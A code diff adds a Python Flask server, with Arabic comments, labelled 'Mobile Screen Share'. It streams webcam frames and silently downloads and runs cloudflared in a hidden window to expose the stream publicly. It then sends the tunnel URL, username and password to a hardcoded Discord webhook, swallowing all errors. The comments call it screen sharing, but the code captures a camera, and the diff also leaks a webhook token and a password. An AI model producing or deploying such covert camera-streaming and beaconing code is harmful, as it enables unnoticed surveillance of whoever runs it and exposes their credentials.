@@ -1,115 +1,182 @@
-import socket
-import threading
 import json
+import os
+import re
+import subprocess
+import threading
+import time
 import urllib.request
 from flask import Flask, Response, request
-from kivy.app import App
-from kivy.uix.boxlayout import BoxLayout
-from kivy.uix.label import Label
+import cv2
+import numpy as np
 
-# ===== إعدادات السيرفر والأمان والديسكورد =====
+# ===== 1. رابط الـ Webhook الخاص بك في ديسكورد =====
 WEBHOOK_URL = "https://discord.com/api/webhooks/1551205294405582928/DI-CIWvAr1dYSICa5I0Gf6pmn0hTtUksrLaWtL5XXSyrYCOwBOmy8V0mazn_fDVVJ-bp"
-PORT = 8080
+
+# ===== 2. بيانات الأمان =====
 USERNAME = "IMNOTSNEAKER"
 PASSWORD = "3mko@3omar"
 
-server_app = Flask(__name__)
+CREATE_NO_WINDOW = 0x08000000
+
+app = Flask(__name__)
+
 
 def check_auth(username, password):
-    """التحقق من اسم المستخدم وكلمة المرور"""
     return username == USERNAME and password == PASSWORD
 
+
 def authenticate():
-    """طلب تسجيل الدخول في حال لم يتم إدخال البيانات"""
     return Response(
-        'Login Required', 401,
-        {'WWW-Authenticate': 'Basic realm="Login Required"'}
+        'Login Required',
+        401,
+        {'WWW-Authenticate': 'Basic realm="Login Required"'},
     )
 
-@server_app.route('/')
-def home():
-    # حماية الصفحة بكلمة سر
+
+def generate_frames():
+    # استخدام OpenCV للتقاط نافذة الموبايل المفتوحة على جهازك (مثلاً عبر محاكي أو تطبيق عرض مثل scrcpy مفتوح بالخلفية)
+    # أو استخدام التقاط الكاميرا/النافذة المحددة للموبايل
+    cap = cv2.VideoCapture(
+        0
+    )  # يمكنك تغييرها لو تستخدم محاكي أو نافذة عرض محددة
+    while cap.isOpened():
+        ret, frame = cap.read()
+        if not ret:
+            break
+        frame = cv2.resize(frame, (720, 1280))  # أبعاد شاشة الموبايل بالطول
+        _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 65])
+        yield (
+            b'--frame\r\n'
+            b'Content-Type: image/jpeg\r\n\r\n' + buffer.tobytes() + b'\r\n'
+        )
+    cap.release()
+
+
+@app.route('/')
+def index():
     auth = request.authorization
     if not auth or not check_auth(auth.username, auth.password):
         return authenticate()
-        
+
     return '''
     <!DOCTYPE html>
-    <html lang="en">
+    <html lang="ar">
     <head>
         <meta charset="UTF-8">
-        <title>Secure Server</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+        <title>Mobile Screen Share</title>
         <style>
-            body { background-color: #121212; color: #ffffff; font-family: Arial; text-align: center; padding: 50px; }
-            h1 { color: #00e676; }
+            body { margin: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+            img { height: 100%; object-fit: contain; }
         </style>
     </head>
     <body>
-        <h1>Access Granted!</h1>
-        <p>Logged in successfully to mobile server.</p>
+        <img src="/video_feed" />
     </body>
     </html>
     '''
 
-def run_flask():
-    try:
-        server_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
-    except Exception as e:
-        print(f"Server Error: {e}")
 
-def get_local_ip():
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(('8.8.8.8', 80))
-        ip = s.getsockname()[0]
-        s.close()
-        return ip
-    except Exception:
-        return '127.0.0.1'
+@app.route('/video_feed')
+def video_feed():
+    auth = request.authorization
+    if not auth or not check_auth(auth.username, auth.password):
+        return authenticate()
+    return Response(
+        generate_frames(), mimetype='multipart/x-mixed-replace; boundary=frame'
+    )
 
-def send_to_discord(ip):
-    url = f"http://{ip}:{PORT}"
+
+def send_to_discord(public_url):
+    if not WEBHOOK_URL or "discord" not in WEBHOOK_URL:
+        return
+
     payload = {
-        "embeds": [{
-            "title": "📱 Mobile Server Started Automatically!",
-            "color": 5814783,
-            "fields": [
-                {"name": "🔗 Link", "value": f"`{url}`", "inline": False},
-                {"name": "👤 Username", "value": f"`{USERNAME}`", "inline": True},
-                {"name": "🔑 Password", "value": f"`{PASSWORD}`", "inline": True}
-            ]
-        }]
+        "embeds": [
+            {
+                "title": "📱 تم تشغيل بث شاشة الموبايل بنجاح!",
+                "color": 5814783,
+                "fields": [
+                    {
+                        "name": "🔗 رابط البث المباشر",
+                        "value": (
+                            f"[اضغط هنا لفتح البث]({public_url})\n`{public_url}`"
+                        ),
+                    },
+                    {
+                        "name": "👤 اسم المستخدم",
+                        "value": f"`{USERNAME}`",
+                        "inline": True,
+                    },
+                    {
+                        "name": "🔑 كلمة السر",
+                        "value": f"`{PASSWORD}`",
+                        "inline": True,
+                    },
+                ],
+                "footer": {
+                    "text": "Mobile Screen Share • يعمل في الخلفية"
+                },
+            }
+        ]
     }
+
     try:
+        data = json.dumps(payload).encode('utf-8')
         req = urllib.request.Request(
-            WEBHOOK_URL, 
-            data=json.dumps(payload).encode('utf-8'), 
-            headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
+            WEBHOOK_URL,
+            data=data,
+            headers={
+                "Content-Type": "application/json",
+                "User-Agent": "Mozilla/5.0",
+            },
         )
         urllib.request.urlopen(req)
-        print("Sent to Discord successfully.")
-    except Exception as e:
-        print(f"Discord Error: {e}")
+    except Exception:
+        pass
 
-class AutoServerApp(App):
-    def build(self):
-        self.title = "Auto Server"
-        
-        # تشغيل السيرفر وإرسال البيانات للديسكورد فوراً في الخلفية بمجرد فتح التطبيق
-        ip = get_local_ip()
-        threading.Thread(target=run_flask, daemon=True).start()
-        threading.Thread(target=send_to_discord, args=(ip,), daemon=True).start()
 
-        layout = BoxLayout(orientation='vertical', padding=30, spacing=20)
-        
-        self.status_label = Label(
-            text=f"Server is Running!\n\nIP:\nhttp://{ip}:{PORT}",
-            font_size='18sp',
-            halign='center'
+def start_tunnel(port):
+    time.sleep(1)
+    temp_dir = os.environ.get("TEMP", os.getcwd())
+    cf_exe = os.path.join(temp_dir, "cloudflared.exe")
+
+    if not os.path.exists(cf_exe):
+        try:
+            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
+            urllib.request.urlretrieve(url, cf_exe)
+        except Exception:
+            return
+
+    try:
+        cmd = [cf_exe, "tunnel", "--url", f"http://localhost:{port}"]
+        proc = subprocess.Popen(
+            cmd,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            encoding="utf-8",
+            errors="ignore",
+            bufsize=1,
+            creationflags=CREATE_NO_WINDOW,
         )
-        layout.add_widget(self.status_label)
-        
-        return layout
 
-if __name__ == '__main__':
-    AutoServerApp().run()
+        for line in iter(proc.stdout.readline, ""):
+            if "trycloudflare.com" in line:
+                match = re.search(
+                    r"https://[a-zA-Z0-9\.\-]+\.trycloudflare\.com", line
+                )
+                if match:
+                    send_to_discord(match.group(0))
+                    break
+    except Exception:
+        pass
+
+
+if __name__ == "__main__":
+    PORT = 8080
+    threading.Thread(target=start_tunnel, args=(PORT,), daemon=True).start()
+
+    from gevent.pywsgi import WSGIServer
+
+    http_server = WSGIServer(('0.0.0.0', PORT), app)
+    http_server.serve_forever()
